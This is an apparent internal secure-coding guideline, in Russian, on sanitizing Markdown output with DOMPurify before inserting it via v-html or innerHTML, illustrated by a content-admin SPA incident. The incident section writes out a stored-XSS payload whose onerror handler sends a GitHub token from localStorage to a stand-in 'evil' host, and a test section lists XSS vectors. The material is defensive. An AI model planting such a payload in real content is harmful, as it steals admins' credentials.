---
title: 'Вывод Markdown — это HTML от злоумышленника, пока его не очистили'
category: platform
summary: 'marked, markdown-it и им подобные ничего не санируют; их вывод, вставленный через v-html / innerHTML, — это stored XSS для любого, кто может писать контент. Очищайте в точке вставки с помощью DOMPurify.'
principle: 'Любая строка, попадающая в v-html / innerHTML / dangerouslySetInnerHTML, проходит через DOMPurify на границе вставки — без исключений для «доверенного» контента, потому что авторы контента находятся на другом уровне привилегий, чем его читатели.'
severity: non-negotiable
tags: [platform, xss, markdown, dompurify, vue, security]
sources:
  - project: 'SPA для администрирования контента'
    date: 2026-06-11
    note: 'Написанный редактором markdown рендерился через marked + v-html без какого-либо санитайзера; превью открывалось в сессиях главреда и админа, где в localStorage лежал токен GitHub. Эскалация редактор → админ организации одним подготовленным постом.'
related:
  - platform/proxy-must-pin-targets
  - platform/origin-scoped-storage-privacy
order: 6
updated: 2026-06-11
---

Рендереры Markdown перестали поставлять санитайзеры много лет назад. `marked`
объявил свою опцию `sanitize` устаревшей в 2018-м, а потом убрал её, и в документации
прямо сказано, что вывод нужно считать недоверенным. Представление «markdown — это
просто форматирование текста» живёт дольше этого изменения, поэтому
`v-html="md.parse(content)"` продолжают писать.

В одной SPA для администрирования контента (2026-06-11) было ровно это. Панель
превью в редакторе скармливала вывод `marked` в `v-html` без санитайзера где-либо в
дереве зависимостей, а поверх ещё стоял кастомный рендерер сырого HTML для медиа-тегов,
который пропускал HTML-блоки насквозь. Авторы и читатели сидят на разных уровнях
привилегий: пользователи с ролью редактора пишут контент блога, а главреды и админы
рецензируют его в той же панели превью. А вскрываемая сессия дорого стоит, потому что токен
GitHub админа лежал в localStorage со скоупами `repo` и `admin:org`.

Низкопривилегированный редактор коммитит пост с
`<img src=x onerror="fetch('https://evil/?t='+localStorage.gh_token)">`, просит ревью —
и собирает токен админа организации. Stored XSS, где каналом доставки выступает
собственный процесс ревью организации.

## Как применять

Очищайте в точке вставки — это последняя функция, через которую проходит строка,
прежде чем фреймворк отдаст её в DOM:

```ts
import DOMPurify from 'dompurify'

// Default config + blob: URIs (asset previews use object URLs).
const URI_ALLOW =
  /^(?:(?:(?:f|ht)tps?|mailto|tel|blob|callto|sms|cid|xmpp):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i

export const sanitizeHtml = (html: string): string =>
  DOMPurify.sanitize(html, { ALLOWED_URI_REGEXP: URI_ALLOW })
```

```vue
const html = computed(() =>
  sanitizeHtml(m.parse(props.content, { async: false }))
)
```

Две практические заметки из того же фикса:

- **Дефолтная политика URI в DOMPurify блокирует `blob:`.** Если ваше превью
  превращает относительные пути к ассетам в object URL, расширьте регулярку — иначе
  картинки пропадут. Дефолтная политика всё так же пропускает относительные пути и
  `#anchors` через не-буквенную ветку, так что ссылки-сноски и `./assets/` остаются
  нетронутыми.
- **Кастомные рендереры — часть поверхности атаки.** Расширение marked с хуком
  `html({ text })`, возвращающим этот текст, — это явный сквозной проброс сырого HTML.
  Санитайзер должен запускаться *после* каждого рендерера, и именно поэтому граница —
  это точка вставки, а не какое-то место внутри пайплайна.

## Антипаттерны

```ts
// "Content comes from our own repo, it's trusted."
// Your editors are not your admins. Privilege boundary crossed.
<article v-html="marked.parse(content)" />

// Sanitizing input instead of output: the renderer itself can
// construct executable HTML from "safe" markdown constructs.
const safe = stripScriptTags(markdown) // then parse — still XSS
```

Второй вариант ломается, потому что санировать *markdown* — не то же самое, что
санировать *HTML*. Штуки вроде `[x](javascript:alert(1))`, трюки со ссылками в
reference-стиле и расширения рендерера — всё это материализуется уже после того, как
ваша зачистка отработала.

## Контроль

Напишите по юнит-тесту на каждый класс векторов, проверяя вывод санитайзера:
`<script>`, `onerror=`, `javascript:`-href, `<iframe>`, `data:`-URL. Добавьте и
позитивные кейсы, которые нужны вашей фиче (превью через blob, медиа-теги, якоря
сносок), чтобы никто не «починил» сломанное превью, удалив санитайзер. Строгий CSP
(`script-src 'self'`) — это слой защиты в глубину за всем этим, а не замена ему.
